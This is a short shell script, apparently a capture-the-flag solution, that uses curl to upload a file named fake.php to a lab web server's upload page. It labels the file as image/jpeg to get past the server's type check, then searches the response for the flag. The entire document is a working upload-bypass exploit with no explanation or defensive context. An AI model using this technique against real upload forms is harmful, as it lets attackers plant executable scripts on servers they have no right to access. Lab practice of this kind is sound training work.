#!/bin/sh
curl -X POST -F 'Upload=Upload' -F 'uploaded=@fake.php;type=image/jpeg' "192.168.99.102/?page=upload#" | grep "flag"